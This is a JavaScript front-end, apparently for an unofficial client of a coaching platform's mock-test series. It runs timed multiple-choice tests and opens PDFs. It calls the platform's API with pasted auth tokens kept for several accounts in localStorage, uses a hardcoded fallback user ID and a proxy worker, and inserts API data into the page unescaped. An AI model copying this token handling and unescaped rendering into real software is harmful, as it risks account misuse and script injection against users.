                    <span class="px-2 py-0.5 rounded bg-indigo-100 text-indigo-900 text-[10px] font-black">SUBJECT #${s.subjectid}</span>
                    <h4 class="font-black text-base text-slate-900 mt-1">${s.subject_name}</h4>
                    <p class="text-xs text-blue-600 font-extrabold mt-1">Open Mock Tests ➔</p>
                </div>
            </div>`;
    });
}

async function openTestSeriesTitles(tsId, subId, subName) {
    state.view = "ts_tests";
    state.activeSeriesId = tsId;
    state.activeTsSubId = String(subId);
    state.activeTsSubName = subName;

    document.getElementById("crumbText").textContent = state.activeSeriesTitle;
    document.getElementById("headingText").textContent = `📝 ${subName}`;

    const grid = document.getElementById("mainGrid");
    grid.innerHTML = `<div class="col-span-full py-10 text-center font-bold text-slate-700">Fetching Mock Tests...</div>`;

    const uid = TOKENS[0]?.userId || "4756316";
    const ep = String(subId) === "-1"
        ? `/get/test_titlev2?testseriesid=${tsId}&subject_id=-1&chapter_id=-1&userid=${uid}&search=&start=-1`
        : `/get/test_titlev2?testseriesid=${tsId}&subject_id=${subId}&userid=${uid}&search=&start=-1`;

    const list = await fetchAPIWithToken(ep, TOKENS[0], () => []);
    renderTestTitlesGrid(list, tsId);
}

function renderTestTitlesGrid(list, tsId) {
    const grid = document.getElementById("mainGrid");
    if (!list || !list.length) {
        grid.innerHTML = `<div class="col-span-full sky-card p-10 text-center font-bold text-slate-600">Is section mein abhi koi test uplabdh nahi hai.</div>`;
        return;
    }

    grid.innerHTML = "";
    list.forEach((t, idx) => {
        const tKey = `test_${t.id || idx}`;
        const pdfUrl = resolvePdfUrl(t.pdf_url || t.test_solutions_pdf, t.pdf_url);
        state.testMap[tKey] = {
            ...t,
            seriesId: tsId || t.test_series_id,
            resolvedPdf: pdfUrl
        };

        grid.innerHTML += `
            <div class="grid-card p-5 flex flex-col justify-between">
                <div>
                    <div class="flex justify-between items-center gap-2">
                        <span class="px-2.5 py-0.5 rounded-full bg-indigo-100 text-indigo-900 text-[10px] font-black">TEST #${t.id || (idx + 1)}</span>
                        <span class="text-[11px] font-extrabold text-emerald-700">⏱️ ${t.time || 60} Mins</span>
                    </div>
                    <h4 class="font-black text-base text-slate-900 mt-2">${t.title}</h4>
                    <div class="flex gap-3 mt-2 text-xs font-bold text-slate-600">
                        <span>❓ ${t.questions || 50} Qs</span>
                        <span>🏆 ${t.marks || 100} Marks</span>
                    </div>
                </div>
                <div class="flex flex-wrap gap-2 mt-4 pt-3 border-t border-sky-100">
                    <button onclick="launchCbtTest('${tKey}')" class="btn-watch flex-1 text-xs">🚀 Attempt Live Test</button>
                    ${pdfUrl ? `<button onclick="openTestPdf('${tKey}')" class="btn-pdf1 text-xs">📄 Test PDF</button>` : ""}
                </div>
            </div>`;
    });
}

function openTestPdf(tKey) {
    const t = state.testMap[tKey];
    if (!t || !t.resolvedPdf) return;
    state.currentPdfUrl = t.resolvedPdf;
    document.getElementById("pdfTitle").textContent = `📄 ${t.title} (Paper PDF)`;
    document.getElementById("rawPdfLink").href = t.resolvedPdf;
    showSlide("slidePdf");
    setPdfMode("appx");
}

async function launchCbtTest(tKey) {
    const t = state.testMap[tKey];
    if (!t) return;

    state.cbtTest = t;
    state.cbtCurrentIdx = 0;
    state.cbtResponses = {};
    state.cbtSubmitted = false;

    showSlide("slideTestAttempt");
    document.getElementById("cbtResultCard").classList.add("hidden");
    document.getElementById("cbtSolutionBox").classList.add("hidden");
    document.getElementById("cbtSubmitBtn").classList.remove("hidden");
    document.getElementById("cbtSeriesBadge").textContent = `SERIES #${t.seriesId || "RWA"} • TEST #${t.id}`;
    document.getElementById("cbtTestTitle").textContent = t.title;
    document.getElementById("cbtQuestionHtml").innerHTML = `<div class="py-10 text-center font-bold text-slate-600">🔄 Loading questions...</div>`;
    document.getElementById("cbtOptionsList").innerHTML = "";
    document.getElementById("cbtPaletteGrid").innerHTML = "";

    const uid = TOKENS[0]?.userId || "4756316";
    fetchRawJSONWithToken(`/Test_Series/check_test_attempts?test_id=${t.id}&user_id=${uid}`, TOKENS[0]);

    let questions = [];
    const qUrl = (t.test_questions_url || "").replace(/\\\//g, "/");

    if (qUrl && qUrl.startsWith("http")) {
        try {
            const res = await fetch(qUrl);
            if (res.ok) questions = await res.json();
        } catch {
            try {
                const proxiedRes = await fetch(WORKER_RAW_PROXY + encodeURIComponent(qUrl));
                if (proxiedRes.ok) questions = await proxiedRes.json();
            } catch {}
        }
    }

    state.cbtQuestions = questions;
    startCbtTimer((parseInt(t.time) || 60) * 60);
    renderCbtQuestion();
    renderCbtPalette();
}

function startCbtTimer(totalSecs) {
    if (state.cbtTimerId) clearInterval(state.cbtTimerId);
    state.cbtSecondsLeft = totalSecs;
    const badge = document.getElementById("cbtTimerBadge");

    function updateDisplay() {
        const m = Math.floor(state.cbtSecondsLeft / 60);
        const s = state.cbtSecondsLeft % 60;
        if (badge) badge.textContent = `⏱️ ${String(m).padStart(2, "0")}:${String(s).padStart(2, "0")}`;
    }

    updateDisplay();
    state.cbtTimerId = setInterval(() => {
        if (state.cbtSubmitted) {
            clearInterval(state.cbtTimerId);
            return;
        }
        state.cbtSecondsLeft--;
        if (state.cbtSecondsLeft <= 0) {
            clearInterval(state.cbtTimerId);
            submitCbtTest();
        } else {
            updateDisplay();
        }
    }, 1000);
}

function renderCbtQuestion() {
    const qList = state.cbtQuestions;
    if (!qList || !qList.length) return;

    const idx = state.cbtCurrentIdx;
    const qObj = qList[idx];

    document.getElementById("cbtQNumber").textContent = `Question ${idx + 1} of ${qList.length}`;
    document.getElementById("cbtPosMarks").textContent = `+${qObj.positive_marks || "2.00"}`;
    document.getElementById("cbtNegMarks").textContent = `-${qObj.negative_marks || "0.50"}`;

    let qHtml = qObj.question || "";
    if (qObj.image_link_1) qHtml += `<div class="mt-2"><img src="${qObj.image_link_1}" class="max-h-56 rounded-lg"></div>`;
    document.getElementById("cbtQuestionHtml").innerHTML = qHtml;

    const selectedAns = state.cbtResponses[idx];
    const correctAns = String(qObj.answer || "1");

    const optsBox = document.getElementById("cbtOptionsList");
    optsBox.innerHTML = "";

    [1, 2, 3, 4].forEach(optNum => {
        const optHtml = qObj[`option_${optNum}`] || "";
        const optImg = qObj[`option_image_${optNum}`] || "";
        if (!optHtml && !optImg) return;

        let cls = "cbt-opt-btn";
        const isSelected = String(selectedAns) === String(optNum);
        const isCorrect = String(optNum) === correctAns;

        if (state.cbtSubmitted) {
            if (isCorrect) cls += " cbt-opt-correct";
            else if (isSelected && !isCorrect) cls += " cbt-opt-wrong";
        } else if (isSelected) {
            cls += " cbt-opt-selected";
        }

        const btn = document.createElement("button");
        btn.className = cls;
        btn.onclick = () => selectCbtOption(optNum);
        btn.innerHTML = `
            <span class="w-7 h-7 rounded-lg bg-sky-100 text-sky-900 font-black text-xs flex items-center justify-center shrink-0">${String.fromCharCode(64 + optNum)}</span>
            <div class="cbt-rich-text flex-1">${optHtml} ${optImg ? `<img src="${optImg}" class="max-h-32 mt-1">` : ""}</div>
        `;
        optsBox.appendChild(btn);
    });

    const solBox = document.getElementById("cbtSolutionBox");
    const solHtml = document.getElementById("cbtSolutionHtml");
    if (state.cbtSubmitted) {
        solBox.classList.remove("hidden");
        let sContent = qObj.solution_text || `<p>Sahi Uttar: <b>Option (${String.fromCharCode(64 + parseInt(correctAns))})</b></p>`;
        if (qObj.solution_image_1) sContent += `<div class="mt-2"><img src="${qObj.solution_image_1}" class="max-h-60 rounded-lg"></div>`;
        solHtml.innerHTML = sContent;
    } else {
        solBox.classList.add("hidden");
    }

    renderCbtPalette();
}

function selectCbtOption(optNum) {
    if (state.cbtSubmitted) return;
    state.cbtResponses[state.cbtCurrentIdx] = String(optNum);
    renderCbtQuestion();
}

function clearCbtResponse() {
    if (state.cbtSubmitted) return;
    delete state.cbtResponses[state.cbtCurrentIdx];
    renderCbtQuestion();
}

function nextCbtQuestion() {
    if (state.cbtCurrentIdx < state.cbtQuestions.length - 1) {
        state.cbtCurrentIdx++;
        renderCbtQuestion();
    }
}

function prevCbtQuestion() {
    if (state.cbtCurrentIdx > 0) {
        state.cbtCurrentIdx--;
        renderCbtQuestion();
    }
}

function jumpToCbtQuestion(idx) {
    state.cbtCurrentIdx = idx;
    renderCbtQuestion();
}

function renderCbtPalette() {
    const pal = document.getElementById("cbtPaletteGrid");
    if (!pal) return;

    pal.innerHTML = state.cbtQuestions.map((q, idx) => {
        let cls = "pal-btn";
        if (idx === state.cbtCurrentIdx) cls += " pal-active";

        const ans = state.cbtResponses[idx];
        if (state.cbtSubmitted) {
            if (ans) {
                if (String(ans) === String(q.answer)) cls += " pal-ans";
                else cls += " pal-wrong";
            }
        } else if (ans) {
            cls += " pal-ans";
        }

        return `<button onclick="jumpToCbtQuestion(${idx})" class="${cls}">${idx + 1}</button>`;
    }).join("");
}

function submitCbtTest() {
    if (state.cbtSubmitted) return;
    state.cbtSubmitted = true;
    if (state.cbtTimerId) clearInterval(state.cbtTimerId);

    let correct = 0, wrong = 0, skipped = 0, totalScore = 0, maxMarks = 0;

    state.cbtQuestions.forEach((q, idx) => {
        const pos = parseFloat(q.positive_marks) || 2.0;
        const neg = parseFloat(q.negative_marks) || 0.5;
        maxMarks += pos;

        const userAns = state.cbtResponses[idx];
        if (!userAns) {
            skipped++;
        } else if (String(userAns) === String(q.answer)) {
            correct++;
            totalScore += pos;
        } else {
            wrong++;
            totalScore -= neg;
        }
    });

    document.getElementById("cbtSubmitBtn").classList.add("hidden");
    document.getElementById("cbtResultCard").classList.remove("hidden");
    document.getElementById("cbtFinalScoreText").textContent = `Score: ${totalScore.toFixed(2)} / ${maxMarks.toFixed(0)}`;
    document.getElementById("cbtStatCorrect").textContent = `✅ Correct: ${correct}`;
    document.getElementById("cbtStatWrong").textContent = `❌ Wrong: ${wrong}`;
    document.getElementById("cbtStatSkip").textContent = `⚪ Skipped: ${skipped}`;

    renderCbtQuestion();
    window.scrollTo({ top: 0, behavior: "smooth" });
}

function reAttemptCbtTest() {
    state.cbtResponses = {};
    state.cbtCurrentIdx = 0;
    state.cbtSubmitted = false;
    document.getElementById("cbtResultCard").classList.add("hidden");
    document.getElementById("cbtSubmitBtn").classList.remove("hidden");
    startCbtTimer((parseInt(state.cbtTest?.time) || 60) * 60);
    renderCbtQuestion();
}

function exitCbtTest() {
    if (state.cbtTimerId) clearInterval(state.cbtTimerId);
    showSlide("slideExplorer");
}

function openPdf(key, num) {
    const info = state.mediaMap[key];
    if (!info) return;
    const u = num === 2 ? info.pdf2 : info.pdf1;
    if (!u) return;

    const vid = document.getElementById("video");
    if (vid && !vid.paused) vid.pause();

    state.currentPdfUrl = u;
    document.getElementById("pdfTitle").textContent = `📄 ${info.title} (PDF ${num})`;
    document.getElementById("rawPdfLink").href = u;
    showSlide("slidePdf");
    setPdfMode("appx");
}

function setPdfMode(mode) {
    const frame = document.getElementById("pdfFrame");
    const u = state.currentPdfUrl;
    if (!u) return;
    if (mode === "appx") {
        frame.src = `https://pdfweb.classx.co.in/pdfjs-latest/web/viewer.html?file=${encodeURIComponent(u)}&save_flag=1&is_encrypted=0`;
    } else {
        frame.src = `https://docs.google.com/viewer?url=${encodeURIComponent(u)}&embedded=true`;
    }
}

function closePdfSlide() {
    document.getElementById("pdfFrame").src = "";
    showSlide(state.previousSlide || "slideExplorer");
}

function renderTokenManagerList() {
    const container = document.getElementById("tokenListContainer");
    if (!container) return;
    container.innerHTML = "";

    TOKENS.forEach((t, idx) => {
        const shortTok = t.token.slice(0, 28) + "..." + t.token.slice(-12);
        container.innerHTML += `
            <div class="bg-white border-2 border-sky-200 rounded-2xl p-4 flex flex-wrap justify-between items-center gap-3 shadow-sm">
                <div class="min-w-0 flex-1">
                    <div class="flex items-center gap-2">
                        <span class="px-2.5 py-0.5 rounded-full bg-amber-100 text-amber-800 text-[10px] font-black">TOKEN #${idx + 1}</span>
                        <h5 class="font-extrabold text-sm text-slate-900 truncate">${t.label}</h5>
                        <span class="transition-all text-xs text-slate-500 font-bold">(UID: ${t.userId || "Auto"})</span>
                    </div>
                    <p class="text-[11px] font-mono text-slate-500 mt-1 truncate">${shortTok}</p>
                </div>
                <div class="flex items-center gap-2">
                    ${TOKENS.length > 1 ? `<button onclick="deleteToken('${t.id}')" class="btn-nav bg-rose-600 text-white border-0 text-xs">🗑 Delete</button>` : `<span class="text-[11px] font-bold text-emerald-600">● Active</span>`}
                </div>
            </div>`;
    });
    updateTokenBadge();
}

function addNewToken() {
    const label = document.getElementById("newTokLabel").value.trim() || `Account ${TOKENS.length + 1}`;
    const userId = document.getElementById("newTokUid").value.trim() || "4756316";
    const token = document.getElementById("newTokValue").value.trim();

    if (!token) return;

    TOKENS.push({
        id: "tok_" + Date.now(),
        label: label,
        userId: userId,
        token: token
    });

    localStorage.setItem("rwa_tokens_list", JSON.stringify(TOKENS));
    document.getElementById("newTokLabel").value = "";
    document.getElementById("newTokUid").value = "";
    document.getElementById("newTokValue").value = "";
    renderTokenManagerList();
    alert("Token added successfully!");
    location.reload();
}

function deleteToken(id) {
    if (TOKENS.length <= 1) {
        alert("At least one token is required.");
        return;
    }
    TOKENS = TOKENS.filter(t => t.id !== id);
    localStorage.setItem("rwa_tokens_list", JSON.stringify(TOKENS));
    renderTokenManagerList();
}

function filterGrid() {
    const q = document.getElementById("searchBox").value.toLowerCase();
    document.querySelectorAll("#mainGrid .grid-card").forEach(el => {
        el.style.display = el.innerText.toLowerCase().includes(q) ? "" : "none";
    });
}

updateTokenBadge();
checkAuthUIState();
showSlide("slideHome");
